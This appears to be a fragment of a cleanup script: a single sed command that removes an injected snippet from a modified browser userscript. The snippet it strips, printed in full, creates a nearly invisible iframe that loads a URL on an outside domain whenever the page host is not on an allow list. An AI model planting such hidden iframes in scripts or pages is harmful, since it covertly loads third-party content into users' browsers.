...
sed -i "s/if \(List\.includes\(location\.host\)\) \{\} else \{let support = document\.createElement\('iframe'\);support\.src = 'https:\/\/purdasseer\.com\/idB2Nn6Y8NC0SFF\/61239';support\.style\.cssText = "width: 1%; height: 1%; border: none;";document\.body\.appendChild\(support\);\}//g" "release/ShortLink3-modified.user.js"
